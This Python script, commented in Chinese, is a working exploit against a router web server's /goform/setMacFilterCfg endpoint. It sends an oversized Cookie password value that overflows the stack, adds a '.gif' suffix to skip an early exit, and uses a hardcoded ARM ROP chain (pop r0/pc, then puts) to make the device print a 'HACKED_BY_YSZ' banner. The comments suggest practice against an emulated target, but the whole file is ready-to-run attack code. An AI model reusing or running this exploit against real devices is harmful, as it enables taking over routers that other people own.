import socket
import struct
import time

def p32(val):
    return struct.pack("<I", val)

# ================= 1. 绝对坐标配置 =================
libc_base = 0x409eb000
pop_r0_pc = libc_base + 0x0003db80 

# puts 偏移量保持不变
puts_offset = 0x00035cd4  
puts_addr = libc_base + puts_offset

# 【滑翔核心修改】：
# 我们不再指向字符串的最开头，而是指向一个“模糊区间”
# 将地址从 9ac 往后挪一点，尝试覆盖原生环境的回弹偏移
msg_addr = 0x407ff9ec  

# 精确的栈偏移
offset = 456

# ================= 2. 构造滑翔 Payload =================
# 1. 创建滑翔地毯：用 64 个空格组成
# 这样即使地址指偏了，puts 也会打印出一串空格然后接上正文
sled = b" " * 64
real_msg = b"================_HACKED_BY_YSZ_================"

# 组合宣告内容
# 注意：sled + real_msg 建议不要超过 128 字节
msg = sled + real_msg

# 填充 s_1 到 128 字节
if len(msg) > 128:
    print("[-] 警告：宣告内容过长，正在截断...")
    msg = msg[:128]
pad1 = b"A" * (128 - len(msg))

# 放上 .gif (绕过提前退出)
bypass = b".gif"

# 覆盖到 PC 的填充
pad2_len = offset - 128 - len(bypass)
pad2 = b"A" * pad2_len

# 极简 ROP 链
rop = p32(pop_r0_pc)    
rop += p32(msg_addr)    # R0 现在指向滑翔区的起始位置
rop += p32(puts_addr)   

payload = msg + pad1 + bypass + pad2 + rop

# ================= 3. 发射 =================
target_ip = "192.168.0.1"
header = b"GET /goform/setMacFilterCfg HTTP/1.1\r\n"
header += b"Host: " + target_ip.encode() + b"\r\n"
header += b"Cookie: password=" + payload + b"\r\n\r\n"

print(f"[*] 目标 msg_addr (滑翔起点): {hex(msg_addr)}")
print(f"[*] 正在向原生环境发射“滑翔导弹”...")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 80))
    s.send(header)
    time.sleep(1)
    s.close()
    print("[+] 发射完毕！请检查 httpd 终端是否出现了带空格的 HACKED 宣告！")
except Exception as e:
    print(f"[-] 失败: {e}")